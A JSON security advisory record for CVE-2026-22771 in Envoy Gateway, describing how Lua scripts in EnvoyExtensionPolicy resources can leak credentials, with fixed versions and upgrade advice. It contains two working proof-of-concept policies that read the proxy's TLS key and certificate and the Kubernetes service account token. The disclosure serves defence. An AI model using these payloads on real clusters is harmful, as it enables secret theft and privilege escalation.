{
  "Identifier": "CVE-2026-22771",
  "PackageSlug": "go/github.com/envoyproxy/gateway",
  "Title": "Envoy Extension Policy lua scripts injection causes arbitrary command execution",
  "Description": "Envoy Gateway allows users to create Lua scripts that are executed by Envoy proxy using the `EnvoyExtensionPolicy` resource. Administrators can use Kubernetes RBAC to grant users the ability to create `EnvoyExtensionPolicy` resources. Lua scripts in policies are executed in two contexts:\n* An `EnvoyExtensionPolicy` can be attached to Gateway and xRoute resources. Lua scripts in the policy will process traffic in that scope.\n* Lua scripts are interpreted and run by the Envoy Gateway controller pod for validation purposes.\n\nLua scripts executed by Envoy proxy can be used to leak the proxy's credentials. These credentials can then be used to communicate with the control plane and gain access to all secrets that are used by Envoy proxy, e.g. TLS private keys and credentials used for downstream and upstream communication.\n\nFor example, the following EnvoyExtensionPolicy, when executed by Envoy proxy, will leak the proxy's XDS client certificates.\n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\nname: lua-leak\nspec:\ntargetRefs:\n- group: gateway.networking.k8s.io\nkind: HTTPRoute\nname: leak\nlua:\n- type: Inline\ninline: |\nfunction envoy_on_response(response_handle)\nlocal cert = io.open(\"/certs/tls.crt\", \"r\")\nlocal content\nif cert then\ncontent = cert:read(\"*all\")\ncert:close()\nelse\ncontent = \"file-not-found\"\nend\nlocal keyfile = io.open(\"/certs/tls.key\", \"r\")\nlocal contentkey\nif keyfile then\ncontentkey = keyfile:read(\"*all\")\nkeyfile:close()\nelse\ncontentkey = \"file-not-found\"\nend\nlocal keypair = contentkey .. \"\\n\" .. content\nresponse_handle:body():setBytes(keypair)\nresponse_handle:headers():replace(\"content-length\", tostring(#keypair))\nresponse_handle:headers():replace(\"content-type\", \"text/plain\")\nend\n```\n\nThis execution can lead to arbitrary code execution in the Envoy Gateway controller pod. Attackers can leverage this to achieve privilege escalation. For example, the following `EnvoyExtensionPolicy` will read the Envoy Gateway K8s service account token and return it in an error which will be displayed in the resource status.\n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\nname: lua-leak\nspec:\ntargetRefs:\n- group: gateway.networking.k8s.io\nkind: HTTPRoute\nname: backend\nlua:\n- type: Inline\ninline: |\nfunction envoy_on_response(response_handle)\nlocal token = io.open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\", \"r\")\nlocal content\nif token then\ncontent = token:read(\"*all\")\ntoken:close()\nelse\ncontent = \"file-not-found\"\nend\nio.write(content)\nerror(content)\nend\n```\n\nResults in:\n\n```yaml\napiVersion: gateway.envoyproxy.io/v1alpha1\nkind: EnvoyExtensionPolicy\nmetadata:\nname: lua-leak\n[...]\nstatus:\nancestors:\n- ancestorRef:\ngroup: gateway.networking.k8s.io\nkind: Gateway\nname: eg\nnamespace: default\nconditions:\n- lastTransitionTime: \"...\"\nmessage: \"Lua: validation failed for lua body in policy with name envoyextensionpolicy/default/lua-leak/lua/0:\nfailed to validate with envoy_on_response: \u003cstring\u003e:622: [REDACTED TOKEN]\\nstack\ntraceback:\\n\\t[G]: in function 'error'\\n\\t\u003cstring\u003e:622: in function 'envoy_on_response'\\n\\t\u003cstring\u003e:625:\nin main chunk\\n\\t[G]: ?.\"\n```\n\nAttackers can then use this token to steal other secrets, run arbitrary pods in the envoy-gateway-system namespace and delete Envoy Gateway itself.",
  "Date": "2026-01-13",
  "Pubdate": "2026-01-13",
  "AffectedRange": "\u003e=1.6.0-rc.0 \u003c1.6.2||\u003c1.5.7",
  "FixedVersions": [
    "1.6.2",
    "1.5.7"
  ],
  "AffectedVersions": "All versions before 1.5.7, all versions starting from 1.6.0-rc.0 before 1.6.2",
  "NotImpacted": "All versions starting from 1.5.7 before 1.6.0-rc.0, all versions starting from 1.6.2",
  "Solution": "Upgrade to versions 1.5.7, 1.6.2 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2026-22771",
    "https://github.com/advisories/GHSA-xrwg-mqj6-6m22",
    "https://github.com/envoyproxy/gateway/security/advisories/GHSA-xrwg-mqj6-6m22",
    "https://github.com/envoyproxy/gateway"
  ],
  "CvssV2": "",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
  "UUID": "669bba07-78a4-4940-b79d-e94353e7a641"
}